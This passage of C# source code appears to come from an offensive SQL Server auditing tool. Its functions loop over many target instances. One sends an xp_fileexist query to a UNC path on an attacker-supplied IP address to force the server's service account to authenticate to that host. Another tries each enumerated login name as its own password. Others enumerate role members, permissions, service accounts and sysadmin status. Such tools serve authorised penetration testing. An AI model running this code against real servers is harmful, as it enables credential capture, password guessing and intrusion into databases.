                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        string fullcommand = @"xp_fileexist '\\" + attackerip + "\\file'";
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY: " + fullcommand);
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Run query
                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            // Increase counter
                            linkCount = linkCount + 1;
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " attempts made using xp_fileexist.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTPROLEMEMBER
            // ------------------------------------------------------------
            public static string ListRoleMembers()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int roleCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT  @@Servername as [ComputerName],
							    @@SERVICENAME as [Instance],
							    SUSER_NAME(role_principal_id) as [RolePrincipalName],
							    member_principal_id as [PrincipalId],
							    SUSER_NAME(member_principal_id) as [PrincipalName]
							    FROM sys.server_role_members";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name       : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance            : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("RolePrincipalName   : " + CurrentRecord["RolePrincipalName"].ToString());
                                Console.WriteLine("PrincipalId         : " + CurrentRecord["PrincipalId"].ToString());
                                Console.WriteLine("PrincipalName       : " + CurrentRecord["PrincipalName"].ToString());

                                // Increase counter
                                roleCount = roleCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + roleCount + " server role members were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTPRIVS
            // ------------------------------------------------------------
            public static string ListPrivs()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT  @@Servername as [ComputerName],
							    @@SERVICENAME as [Instance],
							    GRE.name as [GranteeName],
							    GRO.name as [GrantorName],
							    PER.class_desc as [PermissionClass],
							    PER.permission_name as [PermissionName],
							    PER.state_desc as [PermissionState],
							    COALESCE(PRC.name, EP.name, N'') as [ObjectName],
							    COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
							    FROM [sys].[server_permissions] as PER
							    INNER JOIN sys.server_principals as GRO
							    ON PER.grantor_principal_id = GRO.principal_id
							    INNER JOIN sys.server_principals as GRE
							    ON PER.grantee_principal_id = GRE.principal_id
							    LEFT JOIN sys.server_principals as PRC
							    ON PER.class = 101 AND PER.major_id = PRC.principal_id
							    LEFT JOIN sys.endpoints AS EP
							    ON PER.class = 105 AND PER.major_id = EP.endpoint_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("GranteeName       : " + CurrentRecord["GranteeName"].ToString());
                                Console.WriteLine("GrantorName       : " + CurrentRecord["GrantorName"].ToString());
                                Console.WriteLine("PermissionClass   : " + CurrentRecord["PermissionClass"].ToString());
                                Console.WriteLine("PermissionName    : " + CurrentRecord["PermissionName"].ToString());
                                Console.WriteLine("PermissionState   : " + CurrentRecord["PermissionState"].ToString());
                                Console.WriteLine("ObjectName        : " + CurrentRecord["ObjectName"].ToString());
                                Console.WriteLine("ObjectType        : " + CurrentRecord["ObjectType"].ToString());

                                // Increase counter
                                linkCount = linkCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " server privileges were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTSERVERINFO
            // ------------------------------------------------------------
            public static string ListServerInfo()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int countAccessible = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    -- Get SQL Server Information

							    -- Get SQL Server Service Name and Path
							    DECLARE @SQLServerInstance varchar(250)
							    DECLARE @SQLServerServiceName varchar(250)
							    if @@SERVICENAME = 'MSSQLSERVER'
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
							    set @SQLServerServiceName = 'MSSQLSERVER'
							    END
							    ELSE
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    END

							    -- Get SQL Server Service Account
							    DECLARE @ServiceaccountName varchar(250)
							    EXECUTE master.dbo.xp_instance_regread
							    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
							    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

							    -- Get authentication mode
							    DECLARE @AuthenticationMode INT
							    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
							    N'Software\Microsoft\MSSQLServer\MSSQLServer',
							    N'LoginMode', @AuthenticationMode OUTPUT

							    -- Get the forced encryption flag
							    BEGIN TRY 
								    DECLARE @ForcedEncryption INT
								    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
								    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
								    N'ForceEncryption', @ForcedEncryption OUTPUT
							    END TRY
							    BEGIN CATCH	            
							    END CATCH

							    -- Return server and version information
							    SELECT  @@servername as [Instance],
							    DEFAULT_DOMAIN() as [DomainName],
							    SERVERPROPERTY('processid') as ServiceProcessID,
							    @SQLServerServiceName as [ServiceName],
							    @ServiceAccountName as [ServiceAccount],
							    (SELECT CASE @AuthenticationMode
							    WHEN 1 THEN 'Windows Authentication'
							    WHEN 2 THEN 'Windows and SQL Server Authentication'
							    ELSE 'Unknown'
							    END) as [AuthenticationMode],
							    @ForcedEncryption as ForcedEncryption,
							    CASE  SERVERPROPERTY('IsClustered')
							    WHEN 0
							    THEN 'No'
							    ELSE 'Yes'
							    END as [Clustered],
							    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
							    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
							    serverproperty('Edition') as [SQLServerEdition],
							    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
							    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
							    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
							    SYSTEM_USER as [Currentlogin],
							    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                // Add to count
                                countAccessible = countAccessible + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + countAccessible + " servers provided information.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKLOGINASPW
            // ------------------------------------------------------------
            public static string CheckLoginAsPw()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int loginCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");

                        // Get logins for instance 
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    n [PrincipalId], SUSER_NAME(n) as [PrincipalName]
							    from ( 
							    select top 500 row_number() over(order by t1.number) as N
							    from   master..spt_values t1 
								       cross join master..spt_values t2
							    ) a
							    where SUSER_NAME(n) is not null";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable logins = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(logins);

                            // Check login user as password for instance 
                            foreach (DataRow CurrentRecord in logins.Select())
                            {
                                // Test login as password										
                                DataTable Databases = new DataTable();
                                try
                                {

                                    // Define connection string 
                                    string ConnectionStringLogin = CreateConnectionString(instance, CurrentRecord["PrincipalName"].ToString(), CurrentRecord["PrincipalName"].ToString(), "SqlLogin", "master");

                                    // Define server info query
                                    string ServerInfoQuery = @"
									    -- Get SQL Server Information

									    -- Get SQL Server Service Name and Path
									    DECLARE @SQLServerInstance varchar(250)
									    DECLARE @SQLServerServiceName varchar(250)
									    if @@SERVICENAME = 'MSSQLSERVER'
									    BEGIN
									    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
									    set @SQLServerServiceName = 'MSSQLSERVER'
									    END
									    ELSE
									    BEGIN
									    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
									    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
									    END

									    -- Get SQL Server Service Account
									    DECLARE @ServiceaccountName varchar(250)
									    EXECUTE master.dbo.xp_instance_regread
									    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
									    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

									    -- Get authentication mode
									    DECLARE @AuthenticationMode INT
									    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
									    N'Software\Microsoft\MSSQLServer\MSSQLServer',
									    N'LoginMode', @AuthenticationMode OUTPUT

									    -- Get the forced encryption flag
									    BEGIN TRY 
										    DECLARE @ForcedEncryption INT
										    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
										    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
										    N'ForceEncryption', @ForcedEncryption OUTPUT
									    END TRY
									    BEGIN CATCH	            
									    END CATCH

									    -- Return server and version information
									    SELECT  @@servername as [Instance],
									    DEFAULT_DOMAIN() as [DomainName],
									    SERVERPROPERTY('processid') as ServiceProcessID,
									    @SQLServerServiceName as [ServiceName],
									    @ServiceAccountName as [ServiceAccount],
									    (SELECT CASE @AuthenticationMode
									    WHEN 1 THEN 'Windows Authentication'
									    WHEN 2 THEN 'Windows and SQL Server Authentication'
									    ELSE 'Unknown'
									    END) as [AuthenticationMode],
									    @ForcedEncryption as ForcedEncryption,
									    CASE  SERVERPROPERTY('IsClustered')
									    WHEN 0
									    THEN 'No'
									    ELSE 'Yes'
									    END as [Clustered],
									    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
									    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
									    serverproperty('Edition') as [SQLServerEdition],
									    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
									    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
									    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
									    SYSTEM_USER as [Currentlogin],
									    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                                    // Attmept connection and grab the server information
                                    SqlConnection connLogin = new SqlConnection(ConnectionStringLogin);
                                    SqlCommand DbQueryOutput = new SqlCommand(ServerInfoQuery, connLogin);
                                    connLogin.Open();

                                    // Read data into table 
                                    DataTable LoginInfo = new DataTable();
                                    SqlDataAdapter dalogin = new SqlDataAdapter(DbQueryOutput);
                                    dalogin.Fill(LoginInfo);
                                    connLogin.Close();

                                    // Increase counter
                                    loginCount = loginCount + 1;

                                    // List status
                                    Console.WriteLine("Instance:" + instance + " Login:" + CurrentRecord["PrincipalName"].ToString() + ": LOGIN SUCCESS");

                                    // Add to access list
                                    foreach (DataRow CurrentRow in LoginInfo.Select())
                                    {
                                        SQLCommands.MasterAccessList.Rows.Add(CurrentRow["Instance"].ToString(), CurrentRow["DomainName"].ToString(), CurrentRow["ServiceProcessID"].ToString(), CurrentRow["ServiceName"].ToString(), CurrentRow["ServiceAccount"].ToString(), CurrentRow["AuthenticationMode"].ToString(), CurrentRow["ForcedEncryption"].ToString(), CurrentRow["Clustered"].ToString(), CurrentRow["SQLServerMajorVersion"].ToString(), CurrentRow["SQLServerVersionNumber"].ToString(), CurrentRow["SQLServerEdition"].ToString(), CurrentRow["SQLServerServicePack"].ToString(), CurrentRow["OSArchitecture"].ToString(), CurrentRow["OsVersionNumber"].ToString(), CurrentRow["Currentlogin"].ToString(), CurrentRow["IsSysadmin"].ToString(), CurrentRow["Currentlogin"].ToString());
                                    }

                                }
                                catch
                                {
                                    Console.WriteLine("Instance:" + instance + " Login:" + CurrentRecord["PrincipalName"].ToString() + ": LOGIN FAILED");
                                }
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + loginCount + " logins were found that use the login name as the password.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            public static string ListLogins()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int loginCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    n [PrincipalId], SUSER_NAME(n) as [PrincipalName]
							    from ( 
							    select top 500 row_number() over(order by t1.number) as N
							    from   master..spt_values t1 
								       cross join master..spt_values t2
							    ) a
							    where SUSER_NAME(n) is not null";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Principal Id      : " + CurrentRecord["PrincipalId"].ToString());
                                Console.WriteLine("Principal Name    : " + CurrentRecord["PrincipalName"].ToString());

                                // Increase counter
                                loginCount = loginCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + loginCount + " logins and/or roles where found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKACCESS 
            // ------------------------------------------------------------
            public static string CheckAccess()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in SQLCommands.MasterDiscoveredList.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = SQLCommands.MasterDiscoveredList.Rows.Count;
                    int countAccessible = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    -- Get SQL Server Information

							    -- Get SQL Server Service Name and Path
							    DECLARE @SQLServerInstance varchar(250)
							    DECLARE @SQLServerServiceName varchar(250)
							    if @@SERVICENAME = 'MSSQLSERVER'
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
							    set @SQLServerServiceName = 'MSSQLSERVER'
							    END
							    ELSE
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    END

							    -- Get SQL Server Service Account
							    DECLARE @ServiceaccountName varchar(250)
							    EXECUTE master.dbo.xp_instance_regread
							    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
							    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

							    -- Get authentication mode
							    DECLARE @AuthenticationMode INT
							    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
							    N'Software\Microsoft\MSSQLServer\MSSQLServer',
							    N'LoginMode', @AuthenticationMode OUTPUT

							    -- Get the forced encryption flag
							    BEGIN TRY 
								    DECLARE @ForcedEncryption INT
								    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
								    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
								    N'ForceEncryption', @ForcedEncryption OUTPUT
							    END TRY
							    BEGIN CATCH	            
							    END CATCH

							    -- Return server and version information
							    SELECT  @@servername as [Instance],
							    DEFAULT_DOMAIN() as [DomainName],
							    SERVERPROPERTY('processid') as ServiceProcessID,
							    @SQLServerServiceName as [ServiceName],
							    @ServiceAccountName as [ServiceAccount],
							    (SELECT CASE @AuthenticationMode
							    WHEN 1 THEN 'Windows Authentication'
							    WHEN 2 THEN 'Windows and SQL Server Authentication'
							    ELSE 'Unknown'
							    END) as [AuthenticationMode],
							    @ForcedEncryption as ForcedEncryption,
							    CASE  SERVERPROPERTY('IsClustered')
							    WHEN 0
							    THEN 'No'
							    ELSE 'Yes'
							    END as [Clustered],
							    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
							    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
							    serverproperty('Edition') as [SQLServerEdition],
							    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
							    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
							    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
							    SYSTEM_USER as [Currentlogin],
							    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                // Add to access list								
